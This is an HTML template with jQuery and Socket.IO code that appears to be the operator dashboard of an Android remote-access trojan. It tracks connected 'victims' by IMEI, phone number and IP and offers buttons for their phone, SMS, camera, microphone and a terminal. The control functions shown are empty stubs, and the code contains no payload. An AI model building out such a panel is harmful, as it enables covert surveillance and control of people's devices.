<div class="container">
    <div class="page-title">
        <h3>Dashboard</h3>
    </div>
    <div class="box box-primary" style="height: 400px;overflow-y: auto;">
        <div class="box-body">
            <table width="100%" class="table table-hover" id="dataTables-example">
                <thead>
                    <tr>
                        <th>Model</th>
                        <th>Device-ID</th>
                        <th>IP Address</th>
                        <th>IMEI</th>
                        <th>API</th>
                        <th>Socekt-ID</th>
                        <th>Phone</th>
                        <th></th>
                    </tr>
                </thead>
                <tbody class="victims-body"> 
                    <tr>
                        <td>Philip Chaney</td>
                        <td>192.168.12.1</td>
                        <td>Manager</td>
                        <td>Manager</td>
                        <td>23</td>
                        <td>Manager</td>
                        <td>Manager</td>
                        <td class="text-end">
                            <button id="btn-connection-status" class="btn btn-outline-danger btn-rounded"><i class="fas fa-wifi"></i></button>
                            <button id="btn-phone" class="btn btn-outline-success btn-rounded"><i class="fas fa-phone"></i></button>
                            <button id="btn-sms" class="btn btn-outline-primary btn-rounded"><i class="fas fa-sms"></i></button>
                            <button id="btn-camera" class="btn btn-outline-secondary btn-rounded"><i class="fas fa-camera"></i></button>
                            <button id="btn-mic" class="btn btn-outline-info btn-rounded"><i class="fas fa-microphone"></i></button>
                            <button id="btn-terminal" class="btn btn-outline-dark btn-rounded"><i class="fas fa-terminal"></i></button>
                        </td>
                    </tr>           
                </tbody>
            </table>

          
        </div>
    </div>
</div>

<div style="overflow-x:auto;width:100%;white-space: normal;height: 150px;" class="container dark-box">
    <div class="box-body log-class" style="font-family: 'Courier Prime', monospace;">
        
    </div>
</div>


<!-- Phone -->
<div class="modal fade" id="phoneModal" tabindex="-1" role="dialog" aria-labelledby="phoneModal" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="phone-modal-title" id="phoneModalLabel">Phone</h5>
          <button type="button" id="phone-modal-dismiss" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
          ...
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary" id="modal-save">Save changes</button>
        </div>
      </div>
    </div>
</div>

<!-- SMS -->
<div class="modal fade" id="smsModal" tabindex="-1" role="dialog" aria-labelledby="smsModal" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="sms-modal-title" id="smsModalLabel">SMS</h5>
          <button type="button" id="sms-modal-dismiss" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
          ...
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary" id="modal-save">Save changes</button>
        </div>
      </div>
    </div>
</div>

<!-- Camera -->
<div class="modal fade" id="cameraModal" tabindex="-1" role="dialog" aria-labelledby="cameraModal" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="camera-modal-title" id="cameraModalLabel">Camera</h5>
          <button type="button" id="camera-modal-dismiss" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
          ...
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary" id="modal-save">Save changes</button>
        </div>
      </div>
    </div>
</div>

<!-- Mic -->
<div class="modal fade" id="micModal" tabindex="-1" role="dialog" aria-labelledby="micModal" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="mic-modal-title" id="micModalLabel">Microphone</h5>
          <button type="button" id="mic-modal-dismiss" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
          ...
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary" id="modal-save">Save changes</button>
        </div>
      </div>
    </div>
</div>

<!-- Terminal -->
<div class="modal fade" id="terminalModal" tabindex="-1" role="dialog" aria-labelledby="terminalModal" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="terminal-modal-title" id="terminalModalLabel">Terminal</h5>
          <button type="button" id="terminal-modal-dismiss" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
          ...
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary" id="modal-save">Save changes</button>
        </div>
      </div>
    </div>
</div>
<script src="{{ url_for('static', filename='assets/js/socketio.js') }}"></script>

<script>
    $(document).ready(function (){
      var socket = io.connect("http://localhost:5001");

      socket.on('after connect', function(msg) {
          $.ajax({
            url: '/log',
            type: 'post',
            data: {
              'data' : msg['data'],
              'highlight' : 'light'
            },
            success: function(data){
              $('.log-class').append(data.htmlresponse)
            }
          });
      });

      socket.on('victims', function(msg) {
        if(msg['data'] != "None"){
          $.ajax({
            url: '/log',
            type: 'post',
            data: {
              'data' : 'Fetching clients from database ...',
              'highlight' : 'light'
            },
            success: function(data){
              $('.log-class').append(data.htmlresponse);
              console.log(msg['data'].length)
              for (var i = 0; i <= (msg['data'].length - 1); i++) {
                var items = []
                for (var j = 0; j <= (msg['data'][i].length - 1); j++){
                  console.log(msg['data'][i][j])
                  items.push(msg['data'][i][j])
                }
                $.ajax({
                  url: '/clients',
                  type: 'post',
                  data: {
                    'model' : items[1],
                    'device-id' : items[2],
                    'ip-address' : items[3],
                    'api' : items[4],
                    'imei' : items[5],
                    'socketid' : items[6],
                    'phone' : items[7]
                  },
                  success: function(data){
                    $('.victims-body').append(data.htmlresponse);
                  }
                });
              }
              $.ajax({
                url: '/log',
                type: 'post',
                data: {
                  'data' : 'Finished fetching clients from database',
                  'highlight' : 'success'
                },
                success: function(data){
                  $('.log-class').append(data.htmlresponse);
                }
              });
            }
          });
          
         
        }else{
          $.ajax({
            url: '/log',
            type: 'post',
            data: {
              'data' : 'No active clients',
              'highlight' : 'danger'
            },
            success: function(data){
              $('.log-class').append(data.htmlresponse);
            }
          });
        }
      });
      
      socket.on('pingback', function(msg){
        $.ajax({
            url: '/log',
            type: 'post',
            data: {
              'data' : `${msg['deviceid']} pinged server, connection is active`,
              'highlight' : 'success'
            },
            success: function(data){
                $('.log-class').append(data.htmlresponse);
            }
        });
      })

      socket.on('update victim ip', function(msg) {
        var ip = document.getElementsByClassName(`ip-address-${msg['data'][0]}`)
        // set ip text msg['ipaddress']
        $.ajax({
            url: '/log',
            type: 'post',
            data: {
              'data' : `${msg['data'][0]} IP address changed to ${msg['data'][1]}`,
              'highlight' : 'light'
            },
            success: function(data){
                $('.log-class').append(data.htmlresponse);
            }
        });
      });

      socket.on('update victim socketid', function(msg) {
        var socketid = document.getElementsByClassName(`socket-id-${msg['data'][0]}`)
        // set socketid text to msg['socketid']
        $.ajax({
            url: '/log',
            type: 'post',
            data: {
              'data' : `${msg['data'][0]} socket id changed to ${msg['data'][1]}`,
              'highlight' : 'light'
            },
            success: function(data){
                $('.log-class').append(data.htmlresponse);
            }
        });
      });

      socket.on('new device', function(msg) {
        var deviceid = msg['data'][1]
        console.log("new device event")
        $.ajax({
          url: '/clients',
          type: 'post',
          data: {
            'model' : msg['data'][0],
            'device-id' : deviceid,
            'ip-address' : msg['data'][2],
            'imei' : msg['data'][3],
            'api' : msg['data'][4],
            'socketid' : msg['data'][5],
            'phone' : msg['data'][6]
          },
          success: function(data){
            $('.victims-body').append(data.htmlresponse);
            $.ajax({
              url: '/log',
              type: 'post',
              data: {
                'data' : `New device connected: ${deviceid}`,
                'highlight' : 'light'
              },
              success: function(data){
                  $('.log-class').append(data.htmlresponse);
                  $('.log-class').scrollTop
              }
            });
          }
        });
      });

      socket.on('update value', function(msg) {
        console.log('Slider value updated');
      });
      

      $("#btn-connection-status").click(function(){
        $.ajax({
            url: '/log',
            type: 'post',
            data: {
              'data' : 'Testing connection with client id',
              'highlight' : 'light'
            },
            success: function(data){
                $('.log-class').append(data.htmlresponse);
            }
        });
        // implement scroll to bottom and write to logs file
      });


      $("#btn-phone").click(function(){
          $("#phoneModal").modal({
              backdrop: 'static',
              keyboard: false
          });
          $("#phoneModal").modal('show');
      });


      $("#phone-modal-dismiss").click(function(){
          $("#phoneModal").modal('hide');
      });


      $("#btn-sms").click(function(){
          $("#smsModal").modal({
              backdrop: 'static',
              keyboard: false
          });
          $("#smsModal").modal('show');
      });


      $("#sms-modal-dismiss").click(function(){
          $("#smsModal").modal('hide');
      });


      $("#btn-camera").click(function(){
          $("#cameraModal").modal({
              backdrop: 'static',
              keyboard: false
          });
          $("#cameraModal").modal('show');
      });


      $("#camera-modal-dismiss").click(function(){
          $("#cameraModal").modal('hide');
      });

      $("#btn-mic").click(function(){
          $("#micModal").modal({
              backdrop: 'static',
              keyboard: false
          });
          $("#micModal").modal('show');
      });


      $("#mic-modal-dismiss").click(function(){
          $("#micModal").modal('hide');
      });


      $("#btn-terminal").click(function(){
          $("#terminalModal").modal({
              backdrop: 'static',
              keyboard: false
          });
          $("#terminalModal").modal('show');
      });


      $("#terminal-modal-dismiss").click(function(){
          $("#terminalModal").modal('hide');
      });
    });
</script>